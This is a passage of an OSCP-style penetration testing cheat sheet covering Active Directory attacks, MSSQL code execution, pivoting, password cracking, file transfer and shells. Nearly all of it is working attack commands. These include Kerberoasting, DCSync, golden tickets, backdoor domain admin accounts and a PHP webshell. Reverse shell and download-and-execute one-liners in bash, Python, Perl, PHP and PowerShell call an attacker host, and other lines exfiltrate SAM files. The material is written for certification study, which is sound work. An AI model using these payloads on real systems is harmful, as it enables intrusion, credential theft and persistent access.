GetNPUsers.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt

# Check all domain users for pre-auth disabled:
GetNPUsers.py corp.local/ -usersfile domain_users.txt \
    -dc-ip 192.168.x.100 -no-pass -format hashcat

# From Windows (Rubeus):
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Kerberoasting

```bash
# From attacker:
GetUserSPNs.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -outputfile kerb.txt

# With NTLM hash:
GetUserSPNs.py corp.local/stephanie \
    -hashes :<NTLM_HASH> -dc-ip 192.168.x.100 -request -outputfile kerb.txt

# From Windows (Rubeus):
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

# Crack:
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Password Spray (with lockout awareness)

```bash
# Check lockout policy FIRST:
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' --pass-pol

# Spray slowly (1 attempt per user, avoid lockout):
crackmapexec smb 192.168.x.100 -u domain_users.txt -p 'Password123' \
    --continue-on-success 2>/dev/null | grep "+"
kerbrute passwordspray -d corp.local --dc 192.168.x.100 \
    domain_users.txt 'Password123'
kerbrute passwordspray -d corp.local --dc 192.168.x.100 \
    domain_users.txt 'Corp2024!'

# Common patterns to try (1 pass per spray, wait between rounds):
# Password123, Welcome1, Summer2024!, Corp2024!, Company@123
# <Season><Year>!, <CompanyName>1, <CompanyName>@123
```

#### GPP / SYSVOL

```bash
# CME module (fastest):
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin

# Manual check:
smbclient //192.168.x.100/SYSVOL -U 'corp.local/stephanie%Password123'
# Search for cpassword in Groups.xml
find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword"
gpp-decrypt <CPASSWORD_VALUE>
```

### Phase 3 & 4: Lateral Movement

#### Pass-the-Hash

```bash
# Verify hash works:
crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth
netexec smb <TARGET_IP> -u user -H <NTLM_HASH>

# Spray hash across subnet:
crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> \
    --local-auth --continue-on-success | grep "+"

# Get interactive shell:
psexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
wmiexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
smbexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>   # no binary on disk
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>

# WMIexec is stealthiest (no service creation):
wmiexec.py -hashes :<NTLM_HASH> corp.local/user@<TARGET_IP>
```

#### Pass-the-Ticket

```bash
# List tickets on Windows victim:
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Import ticket and use:
.\Rubeus.exe asktgt /user:administrator /rc4:<NTLM_HASH> \
    /domain:corp.local /dc:192.168.x.100 /ptt
# Now access resources:
dir \\<TARGET_FQDN>\C$

# From Linux:
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass corp.local/administrator@<TARGET_FQDN>
```

#### Overpass-the-Hash

```bash
# Use NTLM hash to get Kerberos TGT:
.\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /domain:corp.local /ptt
# Then access resources natively

# Linux:
getTGT.py corp.local/user -hashes :<NTLM_HASH> -dc-ip 192.168.x.100
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass corp.local/user@<TARGET_FQDN>
```

### Phase 5: Privilege Escalation to Domain Admin

#### DCSync Attack

```bash
# Check if current user has replication rights (BloodHound shows this):
# Or manual check:
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | \
    ? {($_.ObjectAceType -match "Replication-Get") -and \
       ($_.ActiveDirectoryRights -match "ExtendedRight")}

# Execute DCSync from Linux:
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator

# From Windows (mimikatz):
lsadump::dcsync /user:krbtgt /domain:corp.local
lsadump::dcsync /user:Administrator /domain:corp.local
lsadump::dcsync /all /domain:corp.local     # ALL hashes
```

#### ACL Abuse — Common Paths from BloodHound

```bash
# ── GenericAll / GenericWrite on USER → Force password reset ─
# PowerView:
Set-DomainUserPassword -Identity targetuser \
    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) \
    -Credential $cred

# ── GenericAll / GenericWrite on GROUP → Add to group ────────
Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
# Verify:
Get-DomainGroupMember -Identity "Domain Admins"

# ── WriteDACL on Domain Object → Grant yourself DCSync ───────
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity stephanie \
    -Rights DCSync
# Now run secretsdump

# ── ForceChangePassword → Reset user's password ──────────────
Set-DomainUserPassword -Identity targetuser \
    -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# ── WriteOwner → take ownership then GenericAll ───────────────
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity stephanie
Add-DomainObjectAcl -TargetIdentity targetobject \
    -PrincipalIdentity stephanie -Rights All

# ── GenericAll on Computer → RBCD Attack ─────────────────────
# Step 1: Create attacker-controlled computer account:
addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
    'corp.local/stephanie:Password123' -dc-ip 192.168.x.100

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer:
rbcd.py -delegate-to <TARGET_COMPUTER>$ -delegate-from ATTACKPC$ \
    -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'

# Step 3: Get impersonated service ticket:
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
    'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100

# Step 4: Use ticket:
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
secretsdump.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
```

#### Constrained Delegation Abuse

```bash
# Find constrained delegation accounts:
Get-DomainUser -TrustedToAuth | select samaccountname,msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth | select name,msDS-AllowedToDelegateTo

# Abuse S4U2Self + S4U2Proxy:
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
    -dc-ip 192.168.x.100 'corp.local/<DELEG_USER>:<DELEG_PASS>'

export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
```

#### Unconstrained Delegation Abuse

```bash
# Find computers with unconstrained delegation:
Get-DomainComputer -Unconstrained | select name,dnshostname
# DCs always have this — look for non-DC machines

# If you own the unconstrained delegation machine:
# Step 1: Monitor for incoming tickets:
.\Rubeus.exe monitor /interval:5 /filteruser:DC$

# Step 2: Coerce DC to authenticate to your machine (PrinterBug / PetitPotam):
python3 printerbug.py corp.local/stephanie:'Password123'@<DC_IP> <UNCONS_DELEG_IP>
python3 PetitPotam.py -u stephanie -p 'Password123' <UNCONS_DELEG_IP> <DC_IP>

# Step 3: Capture TGT in Rubeus output → import:
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Step 4: DCSync:
lsadump::dcsync /user:krbtgt
```

### Phase 6: Domain Dominance

```bash
# ── Golden Ticket ────────────────────────────────────────────
# Requirements: krbtgt NTLM hash + Domain SID (from secretsdump)
# Get domain SID:
lookupsid.py corp.local/user:'pass'@192.168.x.100 | grep "Domain SID"
# Or from secretsdump output

# Linux — create + use:
ticketer.py -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>

# Windows (mimikatz):
kerberos::golden /user:Administrator /domain:corp.local \
    /sid:S-1-5-21-XXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt
misc::cmd

# ── Silver Ticket ────────────────────────────────────────────
ticketer.py -nthash <SERVICE_ACCOUNT_NTLM> \
    -domain-sid S-1-5-21-XXX -domain corp.local \
    -spn cifs/<TARGET_FQDN> Administrator
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass //<TARGET_FQDN>/C$

# ── Dump Everything ──────────────────────────────────────────
secretsdump.py corp.local/Administrator:'pass'@192.168.x.100 -just-dc
# Or PTH:
secretsdump.py -hashes <LM>:<NTLM> corp.local/Administrator@192.168.x.100

# ── Persist (exam note-taking, not needed for points) ────────
net user backdoor P@ssw0rd! /add /domain
net group "Domain Admins" backdoor /add /domain
```

---

## 6. MSSQL — RCE & LATERAL MOVEMENT

> MSSQL is a major OSCP attack path. It can give you:
> - **Initial RCE** via xp_cmdshell (if SA or sysadmin creds)
> - **Lateral movement** via linked servers
> - **Hash capture** via UNC path injection → crack/relay
> - **Privilege escalation** via impersonation

### Step 1: Connect to MSSQL

```bash
# From Linux attacker:
mssqlclient.py corp.local/sa@<TARGET_IP> -windows-auth
mssqlclient.py sa@<TARGET_IP>                          # SQL auth (no -windows-auth)
mssqlclient.py corp.local/user:'pass'@<TARGET_IP> -windows-auth

# From Windows:
# sqlcmd:
sqlcmd -S <TARGET_IP> -U sa -P password -Q "SELECT @@version"
# Or PowerUpSQL:
. .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

### Step 2: Enumerate MSSQL

```sql
-- Version and context:
SELECT @@version;
SELECT SYSTEM_USER;        -- SQL login name
SELECT USER_NAME();        -- DB user
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = yes, sysadmin!

-- Enumerate all databases:
SELECT name FROM master.dbo.sysdatabases;

-- Users and roles:
SELECT name, type_desc FROM master.sys.server_principals;
SELECT IS_SRVROLEMEMBER('sysadmin', name) AS is_sa, name 
FROM master.sys.server_principals WHERE type = 'S';

-- Check impersonation rights (CRITICAL — see section below):
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Linked servers (CRITICAL — see section below):
SELECT srvname, srvproduct, isremote FROM master..sysservers;
EXEC sp_linkedservers;
```

### Step 3: Enable xp_cmdshell (if sysadmin)

```sql
-- Check if xp_cmdshell is enabled:
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable it:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig';

-- One-liner reverse shell (generate b64 with msfvenom or revshells.com):
EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>';

-- Download and execute:
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://<LHOST>/nc.exe -OutFile C:\Windows\Temp\nc.exe"';
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd';

-- Add admin user:
EXEC xp_cmdshell 'net user hax P@ss123! /add && net localgroup administrators hax /add';
```

### Step 4: Impersonation Attack (non-sysadmin → sysadmin)

```sql
-- You have a low-priv SQL login but IMPERSONATE permission on SA or sysadmin:
-- First check who you can impersonate:
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate SA or sysadmin user:
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- Should return 1 now

-- Now enable xp_cmdshell and get RCE:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Revert back (if needed):
REVERT;
```

### Step 5: Linked Server Lateral Movement

> This is a KEY OSCP path: MS01 has MSSQL → MS01's MSSQL is linked to MS02's MSSQL → you run commands on MS02

```sql
-- Enumerate linked servers from current MSSQL:
EXEC sp_linkedservers;
SELECT srvname, isremote FROM master..sysservers;

-- Test execution on linked server:
-- Single hop (MS01 → MS02):
SELECT * FROM OPENQUERY("<LINKED_SERVER_NAME>", 'SELECT @@version, @@servername, SYSTEM_USER');
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Execute xp_cmdshell on linked server:
EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
-- Or via OPENQUERY:
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'EXEC xp_cmdshell ''whoami''');

-- Enable xp_cmdshell on linked server if not enabled:
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
EXEC ('xp_cmdshell ''powershell -enc <BASE64_PAYLOAD>''') AT [MS02\SQLEXPRESS];

-- Double hop (MS01 → MS02 → MS03):
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];

-- Get reverse shell on MS02 from MS01's MSSQL link:
EXEC ('xp_cmdshell ''powershell -c "Invoke-WebRequest http://<LHOST>/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe <LHOST> 5555 -e cmd"''') AT [MS02\SQLEXPRESS];
```

### Step 6: UNC Path Injection → Hash Capture

```bash
# If you can't run xp_cmdshell but have any SQL access:
# Trigger MSSQL to authenticate to YOUR SMB → capture NetNTLMv2 hash

# Setup Responder on attacker:
sudo responder -I tun0 -v

# In MSSQL — trigger UNC auth:
EXEC xp_dirtree '\\<LHOST>\share';
EXEC xp_fileexist '\\<LHOST>\share\file';
-- Or via SQLi in web app:
-- '; EXEC xp_dirtree '\\<LHOST>\x'; --

# Capture hash in Responder → crack:
hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay instead of cracking (if SMB signing off):
# Setup relay:
sudo python3 ntlmrelayx.py -t smb://<TARGET_IP> -smb2support
# Trigger UNC:
EXEC xp_dirtree '\\<LHOST>\share';
# Get SAM dump or shell on TARGET
```

### Step 7: Read/Write Files via MSSQL

```sql
-- Read file (needs BULK INSERT permission):
BULK INSERT ##tempcsv FROM 'C:\Windows\System32\drivers\etc\hosts'
WITH (ROWTERMINATOR = '\n', FIELDTERMINATOR = ',');
SELECT * FROM ##tempcsv;

-- Read file via OPENROWSET:
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) t;
SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) t;

-- Write file (if sysadmin + proper permissions):
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\cmd.php';
```

### MSSQL Full Attack Decision Tree

```
MSSQL Found (port 1433 or 1434 UDP)
        │
        ▼
Try default/found creds:
    sa : (blank)
    sa : sa
    sa : password
    sa : Password123
    <hostname> : <hostname>
    <domain_user> : <known_pass>
        │
    ┌───┴───┐
    │       │
 Sysadmin? Not sysadmin?
    │       │
    │       ▼
    │   Check IMPERSONATE rights
    │   → Can impersonate SA? → EXECUTE AS LOGIN='sa'
    │   → Now sysadmin!
    │       │
    ▼       ▼
Enable xp_cmdshell → RCE on current server
        │
        ▼
Check linked servers (sp_linkedservers)
        │
    ┌───┴────────────────────────────┐
    │                                │
No links                      Links found
    │                                │
    │                         Execute on linked server
    │                         → xp_cmdshell there
    │                         → Get shell on MS02/DC
    │
    ▼
UNC injection → Responder → crack NetNTLMv2
→ or NTLM relay if SMB signing off
```

---

## 7. PIVOTING & TUNNELING

### When Do You Need to Pivot?

```
MS01 (192.168.x.101) → needs to reach MS02 (10.10.10.50)
Local service only accessible from victim machine (ss -tlnp shows 127.0.0.1)
Found creds for internal host not directly reachable
AD DC on internal subnet, not directly accessible
```

### Ligolo-ng (Best for OSCP — Full Network Tunnel)

```bash
# ── SETUP ────────────────────────────────────────────────────
# 1. Download both binaries from GitHub releases
#    proxy (attacker) + agent (victim)
# https://github.com/nicocha30/ligolo-ng/releases

# 2. Attacker — create tun interface and start proxy:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 3. Transfer agent to MS01:
python3 -m http.server 80
# On MS01 Windows:
certutil -urlcache -split -f http://<LHOST>/agent.exe agent.exe
.\agent.exe -connect <LHOST>:11601 -ignore-cert
# On MS01 Linux:
./agent -connect <LHOST>:11601 -ignore-cert

# 4. In ligolo-ng proxy console:
session                              # Select the agent
ifconfig                             # See MS01's network interfaces
                                     # Note internal IPs (e.g. 10.10.10.0/24)

# 5. Start tunnel:
start

# 6. On attacker — add route to internal network:
sudo ip route add 10.10.10.0/24 dev ligolo
# Test: ping 10.10.10.50 (MS02) directly from attacker!

# 7. Now run all tools against MS02 as if it's local:
nmap -sV 10.10.10.50
crackmapexec smb 10.10.10.50 -u user -p pass
evil-winrm -i 10.10.10.50 -u user -p pass

# ── LISTENER (expose victim's internal port to attacker) ──────
# E.g. MS02 has web app on port 80 only accessible locally:
# In ligolo console:
listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
# Access via: http://127.0.0.1:8080

# ── DOUBLE PIVOT (MS01 → MS02 → MS03) ────────────────────────
# Run second agent on MS02 (after getting shell there):
# Transfer agent to MS02 via ligolo listener:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# On MS02:
.\agent.exe -connect <MS01_IP>:11601 -ignore-cert
# Back in ligolo proxy: new session appears → start → add route
sudo ip route add 172.16.0.0/24 dev ligolo
```

### Chisel (Alternative)

```bash
# Attacker (reverse SOCKS server):
./chisel server -p 8888 --reverse

# Victim (reverse SOCKS client):
.\chisel.exe client <LHOST>:8888 R:socks
# Now proxychains points to 127.0.0.1:1080
# /etc/proxychains4.conf: socks5 127.0.0.1 1080

# Use proxychains:
proxychains nmap -sT -Pn 10.10.10.50
proxychains crackmapexec smb 10.10.10.50 -u user -p pass
proxychains evil-winrm -i 10.10.10.50 -u user -p pass

# Specific port forward (victim local port to attacker):
.\chisel.exe client <LHOST>:8888 R:3306:127.0.0.1:3306
# Access 127.0.0.1:3306 on attacker = victim's local MySQL
```

### SSH Tunneling

```bash
# Local port forward (access remote host's port locally):
ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> user@<MS01_IP>
# Example: access MS02's RDP via localhost:
ssh -L 3389:10.10.10.50:3389 user@<MS01_IP>
xfreerdp /v:localhost:3389 /u:user /p:pass

# Dynamic SOCKS (access full internal network):
ssh -D 1080 -N user@<MS01_IP>
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.0/24

# Reverse tunnel (victim calls home, useful when victim can't be reached):
# On victim:
ssh -R 4444:127.0.0.1:4444 attacker@<LHOST>
# Useful: expose victim's local SMB to attacker:
ssh -R 445:127.0.0.1:445 attacker@<LHOST>
```

### Plink (Windows — when no SSH client)

```powershell
# Download from attacker:
certutil -urlcache -split -f http://<LHOST>/plink.exe plink.exe

# Create reverse tunnel:
cmd /c echo y | .\plink.exe -ssh -l root -pw <SSH_PASS> \
    -R 127.0.0.1:4455:127.0.0.1:445 <LHOST>
# Now attacker's 4455 → victim's 445
```

---

## 8. PASSWORD ATTACKS

### Hash Identification

```bash
hashid <HASH>
hash-identifier   # interactive
# Online: https://hashes.com/en/tools/hash_identifier

# Common hash types:
# $1$    → MD5crypt       (-m 500)
# $2y$   → bcrypt         (-m 3200)
# $5$    → SHA256crypt    (-m 7400)
# $6$    → SHA512crypt    (-m 1800)
# 32 hex → NTLM           (-m 1000) or MD5 (-m 0)
# NTLM always 32 char hex, no salt
```

### Hashcat Modes Reference

```bash
# hashcat -m <MODE> hashfile.txt wordlist.txt [rules]
# Modes:
    0     → MD5
    100   → SHA1
    1000  → NTLM         (Windows local hashes)
    1400  → SHA256
    1800  → SHA512crypt  (Linux /etc/shadow $6$)
    500   → MD5crypt     (Linux /etc/shadow $1$)
    3200  → bcrypt       ($2a$, $2b$, $2y$)
    5600  → NetNTLMv2    (Responder capture)
    5500  → NetNTLMv1
    13100 → Kerberoast   (TGS-REP)
    18200 → AS-REP       (AS-REP roast)
    22000 → WPA2-PBKDF2

# Examples:
hashcat -m 1000 ntlm.txt rockyou.txt                          # NTLM
hashcat -m 5600 netntlm.txt rockyou.txt                       # NetNTLMv2
hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule     # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt                        # AS-REP
hashcat -m 1800 shadow.txt rockyou.txt                        # Linux SHA512
# Rule files:
/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/d3ad0ne.rule
/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule  # most comprehensive
```

### Custom Wordlists

```bash
# CeWL — scrape target website for words:
cewl http://<TARGET_IP> -m 5 -d 3 -w cewl.txt
cewl http://<TARGET_IP> -m 5 -d 3 --with-numbers -w cewl_nums.txt

# Username generation from full names:
# If you find "John Smith":
john          smith         jsmith
j.smith       johnsmith     smithjohn
john.smith    J.Smith       John.Smith

# Mutate wordlist with hashcat rules:
hashcat --stdout wordlist.txt -r rules/best64.rule > mutated.txt
```

### Online Brute Force

```bash
# SSH:
hydra -l root -P rockyou.txt ssh://<TARGET_IP> -t 4 -V
# HTTP POST:
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"
# HTTP Basic Auth:
hydra -l admin -P rockyou.txt http-get://<TARGET_IP>/admin/
# FTP:
hydra -L users.txt -P rockyou.txt ftp://<TARGET_IP> -t 10
# MSSQL:
hydra -l sa -P rockyou.txt mssql://<TARGET_IP>
# RDP:
crowbar -b rdp -s <TARGET_IP>/32 -u administrator -C rockyou.txt

# netexec/CME for SMB/WinRM:
netexec smb <TARGET_IP> -u users.txt -p passwords.txt --no-bruteforce
netexec winrm <TARGET_IP> -u users.txt -p passwords.txt
```

### NTLM Capture & Relay

```bash
# Capture via Responder (wait for connections):
sudo responder -I tun0 -dwv
# Crack captured NetNTLMv2:
hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt

# NTLM Relay (SMB signing disabled targets):
# Step 1: Check signing:
netexec smb <SUBNET>/24 --gen-relay-list unsigned.txt
# Step 2: Run relay (disable Responder SMB/HTTP):
sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
# Step 3: Trigger authentication (click link, run MSSQL UNC, etc.)
# Gets: SAM dump, or shell, or user creation depending on priv

# With interactive shell option:
sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support -i
# After hit: nc 127.0.0.1 <RELAY_PORT>
```

---

## 9. FILE TRANSFER CHEATSHEET

### Linux → Windows (Download on victim)

```powershell
# PowerShell:
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')  # execute in memory
(New-Object Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\Temp\file.exe')
Invoke-WebRequest -Uri http://<LHOST>/file.exe -OutFile C:\Temp\file.exe
wget http://<LHOST>/file.exe -OutFile C:\Temp\file.exe  # PS alias

# Certutil (often available, sometimes flagged):
certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe

# BITS:
bitsadmin /transfer job /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe

# SMB (set up server on attacker):
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
# Windows copy:
copy \\<LHOST>\share\file.exe C:\Temp\
# Or map drive:
net use Z: \\<LHOST>\share
copy Z:\file.exe C:\Temp\
```

### Windows → Linux (Exfil from victim)

```powershell
# SMB (upload to attacker's share):
# Attacker: impacket-smbserver share . -smb2support -username user -password pass
copy C:\Windows\System32\config\SAM \\<LHOST>\share\SAM

# HTTP POST (if attacker has upload server):
# Attacker: python3 uploadserver.py (pip install uploadserver)
Invoke-WebRequest -Uri http://<LHOST>/upload -Method POST \
    -InFile C:\loot\dump.zip -ContentType "application/octet-stream"

# Base64 encode → copy paste:
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
# Attacker decode:
echo '<BASE64_STRING>' | base64 -d > file.txt

# Netcat:
# Attacker: nc -lvnp 9001 > file.exe
# Victim: nc.exe <LHOST> 9001 < C:\file.exe
```

### Linux → Linux

```bash
# Python HTTP server:
python3 -m http.server 80
wget http://<LHOST>/file
curl http://<LHOST>/file -o file

# SCP:
scp file.txt user@<TARGET_IP>:/tmp/

# Netcat:
# Receiver: nc -lvnp 4444 > file
# Sender:   nc <RECEIVER_IP> 4444 < file

# Base64:
base64 -w0 file.exe   # encode
echo '<BASE64_STRING>' | base64 -d > file.exe  # decode
```

---

## 10. SHELLS & UPGRADES

### Reverse Shell One-Liners

```bash
# ── Linux ─────────────────────────────────────────────────────
# Bash:
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
/bin/bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# Bash URL encoded (for injection in URLs):
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F4444%200%3E%261%22

# Python:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP (webshell):
<?php system($_GET["cmd"]); ?>

# PHP reverse:
php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl:
perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Netcat with -e:
nc -e /bin/sh <LHOST> 4444
# Netcat no -e (mkfifo):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f

# ── Windows ───────────────────────────────────────────────────
# PowerShell base64:
# Generate on attacker:
python3 -c "
import base64
cmd = 'IEX(New-Object Net.WebClient).DownloadString(\"http://<LHOST>/shell.ps1\")'
b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
print('powershell -nop -w hidden -enc ' + b64)
"
# PowerShell one-liner:
powershell -nop -w hidden -c "\$c=New-Object Net.Sockets.TCPClient('<LHOST>',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$rb=[text.encoding]::ASCII.GetBytes(\$sb2);\$s.Write(\$rb,0,\$rb.Length)}"

# Msfvenom payloads:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
```

### Shell Upgrade (Linux — TTY)

```bash
# Method 1: Python PTY (most reliable)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR python2:
python -c 'import pty; pty.spawn("/bin/bash")'
# Then:
Ctrl+Z                              # background the shell
stty raw -echo; fg                  # raw mode, bring back
# Press Enter (or type 'reset' if garbled)
export TERM=xterm
export SHELL=/bin/bash
stty rows 48 columns 190            # match your terminal exactly
# Check your terminal: stty size

# Method 2: Script
script /dev/null -c bash
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Method 3: Socat (best quality, needs socat on victim)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim (download socat first):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
```

---

## 11. EXPLOIT DEVELOPMENT (BOF REFERENCE)

### Windows x86 Stack Buffer Overflow

```python
# ── Step 1: Fuzzing ──────────────────────────────────────────
import socket, time

payload = b"A" * 100
while True:
    try:
        s = socket.socket()
        s.connect(('TARGET_IP', PORT))
        banner = s.recv(1024)
        s.send(b"COMMAND " + payload + b"\r\n")
        s.close()
        print(f"[*] Sent {len(payload)} bytes")
        payload += b"A" * 100
        time.sleep(1)
    except Exception as e:
        print(f"[!] Crashed at ~{len(payload)} bytes")
        break

# ── Step 2: EIP Offset ───────────────────────────────────────
# Generate pattern:
msf-pattern_create -l <CRASH_LENGTH>
